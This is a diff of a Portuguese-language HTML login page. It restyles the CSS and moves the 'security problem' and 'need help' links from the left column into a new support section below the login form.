@@ -8,8 +8,7 @@
         /* Reset básico */
         body {
             margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: #f5f5f5; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
             display: flex;
             flex-direction: column;
             min-height: 100vh;
@@ -32,9 +31,7 @@
         }
         
         /* --- ESTILOS DO CONTEÚDO PRINCIPAL --- */
-
         .main-content {
-            flex-grow: 1;
             display: flex;
             justify-content: center; 
             align-items: flex-start; 
@@ -42,7 +39,6 @@
             gap: 64px;
         }
         
-        /* NOVO: Container para a coluna da esquerda */
         .left-column {
             display: flex;
             flex-direction: column;
@@ -68,8 +64,16 @@
             padding: 48px;
             box-sizing: border-box;
         }
-        
-        /* --- ESTILOS DOS NOVOS LINKS --- */
+
+        /* --- NOVO CONTAINER PARA OS LINKS DE SUPORTE --- */
+        .support-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Centraliza os links na página */
+            width: 100%;
+            margin-top: 48px; /* Espaço em relação ao conteúdo de cima */
+            padding-bottom: 48px; /* Espaço na parte de baixo */
+        }
         
         .security-link {
             display: flex;
@@ -79,12 +83,15 @@
             border: 1px solid #e0e0e0;
             border-radius: 6px;
             padding: 14px 16px;
-            margin-top: 32px; /* Espaço abaixo do título */
             text-decoration: none;
             color: #333;
             font-size: 14px;
             font-weight: 500;
             transition: box-shadow 0.2s;
+            /* LARGURA FIXA PARA O BOTÃO */
+            width: 100%;
+            max-width: 320px;
+            box-sizing: border-box;
         }
 
         .security-link:hover {
@@ -105,12 +112,9 @@
             font-size: 14px;
             font-weight: 500;
         }
-
-        .help-link:hover {
-            text-decoration: underline;
-        }
-
-        /* Outros estilos permanecem os mesmos */
+        .help-link:hover { text-decoration: underline; }
+        
+        /* Outros estilos */
         .input-label { font-size: 14px; color: #555; margin-bottom: 4px; display: block; font-weight: 400; }
         .input-field { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
         .input-field:focus { outline: 1px solid #3483fa; border-color: #3483fa; }
@@ -133,16 +137,7 @@
         <div class="left-column">
             <h1 class="main-title">Digite seu CPF, e-mail ou<br>telefone para iniciar sessão</h1>
 
-            <a href="#" class="security-link">
-                <span class="icon-text">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-                    <span>Tenho um problema de segurança</span>
-                </span>
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
-            </a>
-
-            <a href="#" class="help-link">Preciso de ajuda</a>
-        </div>
+            </div>
 
         <div class="form-card">
             <form id="login-form">
@@ -158,6 +153,18 @@
         </div>
 
     </main>
+
+    <div class="support-section">
+        <a href="#" class="security-link">
+            <span class="icon-text">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                <span>Tenho um problema de segurança</span>
+            </span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
+        </a>
+
+        <a href="#" class="help-link">Preciso de ajuda</a>
+    </div>
 
 </body>
 </html>
